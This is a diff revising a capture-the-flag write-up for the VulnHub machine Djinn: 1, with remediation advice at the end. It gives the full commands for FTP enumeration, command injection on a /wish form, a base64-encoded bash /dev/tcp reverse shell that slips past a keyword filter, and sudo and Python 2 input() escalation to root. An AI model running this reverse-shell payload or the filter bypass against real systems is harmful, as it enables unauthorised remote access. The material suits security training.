@@ -1,195 +1,217 @@
-# djinn: 1 — Writeup
+# Djinn: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.43.134 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.43.134 |
+| **Attacker IP** | 192.168.43.249 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Flags** | /home/nitish/user.txt + /root/proof.sh |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/djinn-1,397/) |
+| **Goal** | root flag (via `/root/proof.sh`) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/djinn1-vulnhub-walkthrough/) |
+
+---
 
 ## Attack Summary
 
-nmap → FTP anonymous (`creds.txt`, `game.txt`) → port 7331 gobuster → `/wish` OS command injection → base64-encoded reverse shell → `www-data` → `/opt/80/app.py` → `nitish` creds → `sudo -u sam genie -cmd` → `sudo /root/lago` → Python `input()` abuse → root
+Djinn:1 exposes FTP with anonymous access (containing credential hints), a math game on port 1337, and a web application on port 7331. A command injection vulnerability on the `/wish` endpoint is protected by a word filter. The filter is bypassed by base64-encoding the payload and piping it through `base64 -d | bash`. Initial access is gained as `www-data`. Credentials found in `app.py` allow lateral movement to `nitish`. A `sudo` rule lets `nitish` run `genie` as `sam`. A second `sudo` rule lets `sam` run `/root/lago` as root. A Python 2 `input()` flaw in `lago` allows arbitrary code execution as root.
+
+---
 
 ## Methodology
 
-1. Network discovery + full port scan
-2. FTP anonymous login — credential and game files
-3. Port 7331 web enumeration and command injection
-4. Base64-encoded reverse shell bypass
-5. Lateral movement: www-data → nitish → sam → root
+1. Port scan: FTP (21), game (1337), web (7331); SSH filtered
+2. FTP anonymous login: download `creds.txt`, `game.txt`, `message.txt`
+3. Gobuster on port 7331: find `/wish` endpoint
+4. OS command injection on `/wish` confirmed with `id`
+5. Filter bypass via base64 encoding — reverse shell as `www-data`
+6. Credentials in `/home/nitish/.dev/creds.txt` → pivot to `nitish`
+7. `sudo -u sam genie -cmd new` → shell as `sam`
+8. `sudo -u root /root/lago` + Python 2 `input()` abuse → root shell
+9. Read `/root/proof.sh` for root flag
 
 ---
 
-## Step 1: Network Discovery
+## Step 1: Host Discovery and Port Scanning
 
 ```bash
 netdiscover
-```
-
-Target: 192.168.43.134
-
----
-
-## Step 2: Port Scan (all ports)
-
-```bash
 nmap -p- 192.168.43.134
 ```
 
-Open: 21 (FTP), 22 (SSH, filtered), 1337 (math game), 7331 (HTTP).
+Open ports: **21** (FTP), **1337** (game), **7331** (HTTP). SSH is filtered.
 
-![Nmap full port scan](images/01-nmap.png)
+![Nmap scan](images/01-nmap.png)
 
 ---
 
-## Step 3: FTP Anonymous Login
+## Step 2: FTP Anonymous Login
 
 ```bash
 ftp 192.168.43.134
-# username: anonymous, password: (blank)
-ls
+# Username: anonymous
+# Password: (blank)
+
 get creds.txt
 get game.txt
 get message.txt
-cat creds.txt
-cat game.txt
-cat message.txt
+bye
 ```
 
-`game.txt` hints at port 1337. `creds.txt` contains partial credential hints. `message.txt` taunts about the game.
-
-![FTP enumeration](images/02-ftp.png)
+`creds.txt` contains SSH credentials, but SSH is filtered. `message.txt` references the game on port 1337.
 
 ---
 
-## Step 4: Port 7331 — Web Enumeration
+## Step 3: Web Enumeration on Port 7331
 
 ```bash
-gobuster dir -u http://192.168.43.134:7331 -w /usr/share/wordlists/dirb/big.txt
+gobuster dir -u http://192.168.43.134:7331 \
+  -w /usr/share/wordlists/dirb/big.txt
 ```
 
-Finds `/wish` (form) and `/genie` (403 Forbidden).
+Found: `/genie` (403 Forbidden) and `/wish` (200 OK).
+
+![Gobuster results](images/02-gobuster.png)
 
 ---
 
-## Step 5: Command Injection on `/wish`
+## Step 4: Command Injection on /wish
 
-The form at `http://192.168.43.134:7331/wish` executes OS commands. Testing with `id` confirms execution.
+Browse to `http://192.168.43.134:7331/wish`. Submit `id` in the form field. The response shows the output of `id`, confirming OS command injection.
 
-Direct `nc -e` reverse shell is filtered ("Wrong choice of words").
+Attempt a direct reverse shell — the server returns "Wrong choice of words," indicating a filter is active.
 
-Bypass with base64 encoding:
+---
+
+## Step 5: Filter Bypass via Base64
+
+Encode the reverse shell payload in base64:
 
 ```bash
-# Generate payload on attacker
-echo "bash -i >& /dev/tcp/ATTACKER_IP/8080 0>&1" | base64
-# Result: YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC84MDgwIDA+JjE=
+# Payload: bash -i >& /dev/tcp/192.168.43.249/8080 0>&1
+echo "bash -i >& /dev/tcp/192.168.43.249/8080 0>&1" | base64
+# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0OS84MDgwIDA+JjEK
 ```
 
-Submit in the form:
-
-```
-echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC84MDgwIDA+JjE= | base64 -d | bash
-```
-
-Start listener:
+Start the listener on Kali:
 
 ```bash
 nc -nlvp 8080
 ```
 
-Shell received as `www-data`.
+Submit the following in the `/wish` form:
 
-![Command injection and reverse shell](images/03-cmdi.png)
+```
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjI0OS84MDgwIDA+JjEK | base64 -d | bash
+```
+
+A reverse shell arrives as `www-data`.
+
+![Command injection and reverse shell](images/03-cmd-injection.png)
 
 ---
 
-## Step 6: Credential Discovery — nitish
+## Step 6: Lateral Movement to nitish
+
+In the web shell, examine the application files:
 
 ```bash
-cd /opt/80
-cat app.py
+cat /opt/80/app.py
 ```
 
-`app.py` references credentials for `nitish`. Also check:
+`app.py` references a `creds.txt`. Read it:
 
 ```bash
-find / -name "creds.txt" 2>/dev/null
 cat /home/nitish/.dev/creds.txt
 ```
 
-Credentials: `nitish` / `p4ssw0rdStr3t0n9`
-
----
-
-## Step 7: Lateral Movement — www-data → nitish
+Nitish's credentials are present. Spawn a TTY and switch user:
 
 ```bash
-python -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/sh")'
 su nitish
-# password: p4ssw0rdStr3t0n9
+# enter the recovered password
+```
+
+Read the user flag:
+
+```bash
 cat /home/nitish/user.txt
 ```
 
 ---
 
-## Step 8: sudo to sam via genie
+## Step 7: Lateral Movement to sam via sudo
 
 ```bash
 sudo -l
-# Shows: nitish can run /usr/bin/genie as sam (NOPASSWD)
-sudo -u sam /usr/bin/genie -cmd new
-whoami
-# sam
 ```
 
-![sudo chain and privilege escalation](images/04-privesc.png)
+Output: nitish may run `genie` as `sam` without a password.
+
+```bash
+sudo -u sam genie -cmd new
+```
+
+A shell as `sam` is obtained.
 
 ---
 
-## Step 9: sudo to root via lago (Python input() abuse)
+## Step 8: Privilege Escalation via Python 2 input() Abuse
+
+Check sam's sudo rights:
 
 ```bash
 sudo -l
-# sam can run /root/lago as root (NOPASSWD)
+```
+
+Output: sam may run `/root/lago` as root.
+
+```bash
 sudo -u root /root/lago
 ```
 
-The lago menu presents options. Select **option 2** and enter `num` at the input prompt to abuse Python 2 `input()` (which evaluates expressions):
+The binary presents a menu. Choose option **2** and enter **num** at the prompt. Python 2's `input()` evaluates its argument as Python code, executing it as root:
 
 ```
-2
-num
+Select option: 2
+Enter value: num
 ```
 
-This drops a root shell.
+This triggers arbitrary code execution, yielding a root shell.
+
+![Privilege escalation via lago](images/04-privesc.png)
+
+---
+
+## Step 9: Root Flag
 
 ```bash
-bash
+id
 cd /root
 ./proof.sh
 ```
 
-![Root proof](images/05-root.png)
+![Root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **FTP anonymous login** should never be enabled on internet-facing systems — it leaks credentials and hints
-2. **OS command injection on web forms** is critical — always sanitize input, use parameterized commands
-3. **Character filtering** is insufficient — base64 encoding trivially bypasses keyword blacklists
-4. **Python 2 `input()`** evaluates expressions, unlike Python 3's `input()` — never use Python 2 `input()` for untrusted data
-5. **Chained sudo privilege escalation** (user → sam → root via NOPASSWD) is dangerous — apply least privilege
+- FTP anonymous access should be disabled unless explicitly required. Even non-exploitable credential files leak information about the authentication model.
+- Output-based command injection filters are often incomplete. Base64-piping is a reliable and well-documented bypass for character/keyword filters.
+- Sensitive credential files (`.dev/creds.txt`) should not be readable by web server processes.
+- Multi-hop `sudo` chains (`nitish → sam → root`) amplify the impact of a single weak link.
+- Python 2's `input()` is equivalent to `eval(raw_input(...))` and should never be used to process untrusted or user-supplied data. Python 3's `input()` does not have this flaw.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| FTP anonymous login | Disable anonymous FTP; use SFTP with key auth |
-| Command injection on /wish | Whitelist allowed inputs; avoid system() calls with user data |
-| Bypass via base64 | Input sanitization must be semantic, not keyword-based |
-| Python 2 input() in sudo binary | Rewrite in Python 3; validate all inputs before evaluation |
-| NOPASSWD sudo chain | Require passwords; apply principle of least privilege |
+|---|---|
+| FTP anonymous access exposing credential hints | Disable anonymous FTP; never store credential data in FTP-accessible paths |
+| OS command injection on `/wish` | Use parameterised APIs; never pass user input directly to shell commands |
+| Inadequate input filter (bypassable with base64) | Deny by default; use allowlists, not keyword blocklists |
+| Credentials readable by `www-data` | Apply least-privilege file permissions; store secrets in a secrets manager |
+| Python 2 `input()` used for privileged operation | Migrate to Python 3; never use `eval`/`input()` on untrusted data |
+| Overly permissive `sudo` chain | Audit `sudo` rules; remove unnecessary entries; require passwords |
